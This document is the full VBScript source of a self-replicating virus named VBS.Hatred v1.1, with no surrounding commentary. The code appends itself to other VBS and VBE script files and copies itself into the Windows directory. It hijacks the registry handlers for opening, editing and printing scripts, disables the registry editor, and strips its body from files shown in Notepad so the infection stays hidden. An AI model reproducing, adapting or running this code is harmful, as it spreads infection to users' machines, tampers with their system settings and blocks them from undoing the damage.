Wscript.Echo "Virus VBS.Hatred v1.1 is installed on your system. Congratulations!"
'`
On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("Wscript.Shell")
Set OpenBody = FSO.OpenTextFile(Wscript.ScriptFullName, 1)
Buffa = OpenBody.ReadAll
OpenBody.Close
Metka = "'" & Chr(96)
For x = Len(Buffa) To 1 Step -1
If Mid(Buffa, x, 1) = Chr(96) Then
x = 1
OurBody = Metka + OurBody
ElseIf Mid(Buffa, x, 1) <> Chr(96) Then
OurBody = Mid(Buffa, x, 1) + OurBody
End If
Next
Set CmdLine = Wscript.Arguments
If CmdLine.Count <> 0 Then
If CmdLine.Item(0) = "##I" Or CmdLine.Item(0) = "##E" Or CmdLine.Item(0) = "##P" Then
For x = 1 To CmdLine.Count-1 Step 1
If FSO.FileExists (CmdLine.Item(x)) = True Then
VictimName = CmdLine.Item(x)
Set OpenVictim = FSO.OpenTextFile(VictimName, 1)
All = OpenVictim.ReadAll
OpenVictim.Close
If CmdLine.Item(0) = "##I" Then
If Mid(All, Len(All)-2, 3) <> "SMF" Then
DoFile(VictimName)
End If
WshShell.Run FSO.GetSpecialFolder(0) & "\Wscript.exe " & VictimName
ElseIf CmdLine.Item(0) = "##E" Or CmdLine.Item(0) = "##P" Then
If Mid(All, Len(All)-2, 3) = "SMF" Then
x = Len(All)
While Mid(All, x, 1) <> Chr(96)
x = x - 1
Wend
x = x - 2
For y = x To 1 Step -1
ClearVictimBody = Mid(All, y, 1) + ClearVictimBody
Next
Set GetVFile = FSO.GetFile(VictimName)
VAttr = GetVFile.Attributes
GetVFile.Attributes = Normal
Set ClearVictim = FSO.OpenTextFile(VictimName, 2)
ClearVictim.Write ClearVictimBody
ClearVictim.Close
GetVFile.Attributes = VAttr
End If
If CmdLine.Item(0) = "##E" Then
Wait = WshShell.Run (FSO.GetSpecialFolder(0) & "\Notepad.exe " & VictimName, 1, True)
ElseIf CmdLine.Item(0) = "##P" Then
Wait = WshShell.Run (FSO.GetSpecialFolder(0) & "\Notepad.exe /p " & VictimName, 1, True)
End If
DoFile(VictimName)
End If
End If
Next
End If
Else
Set Handler = FSO.CreateTextFile (FSO.GetSpecialFolder(0) & "\WScript.vbs", true)
Handler.Write OurBody
Handler.Close
WshShell.RegWrite "HKCR\VBSFile\Shell\Open\Command\", FSO.GetSpecialFolder(0) & "\WScript.exe " & FSO.GetSpecialFolder(0) & "\WScript.vbs ##I """ & Chr (37) & "1"" " & Chr(37) & "*"
WshShell.RegWrite "HKCR\VBSFile\Shell\Edit\Command\", FSO.GetSpecialFolder(0) & "\WScript.exe " & FSO.GetSpecialFolder(0) & "\WScript.vbs ##E " & Chr (37) & "1"
WshShell.RegWrite "HKCR\VBSFile\Shell\Print\Command\", FSO.GetSpecialFolder(0) & "\WScript.exe " & FSO.GetSpecialFolder(0) & "\WScript.vbs ##P " & Chr (37) & "1"
WshShell.RegWrite "HKCR\VBEFile\Shell\Open\Command\", FSO.GetSpecialFolder(0) & "\WScript.exe " & FSO.GetSpecialFolder(0) & "\WScript.vbs ##I """ & Chr (37) & "1"" " & Chr(37) & "*"
WshShell.RegWrite "HKCR\VBEFile\Shell\Edit\Command\", FSO.GetSpecialFolder(0) & "\WScript.exe " & FSO.GetSpecialFolder(0) & "\WScript.vbs ##E " & Chr (37) & "1"
WshShell.RegWrite "HKCR\VBEFile\Shell\Print\Command\", FSO.GetSpecialFolder(0) & "\WScript.exe " & FSO.GetSpecialFolder(0) & "\WScript.vbs ##P " & Chr (37) & "1"
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
WshShell.RegWrite "HKCR\VBSFile\EditFlags", 24, "REG_DWORD"
WshShell.RegWrite "HKCR\VBEFile\EditFlags", 24, "REG_DWORD"
End If
Function DoFile(VictimName)
Set GetVFile = FSO.GetFile(VictimName)
VAttr = GetVFile.Attributes
GetVFile.Attributes = Normal
Set DoVictim = FSO.OpenTextFile(VictimName, 8)
DoVictim.Write OurBody
DoVictim.Close
GetVFile.Attributes = VAttr
End Function
'Look around! All of us have died!!!
'VBS.Hatred v1.1 by Gobleen Warrior//SMF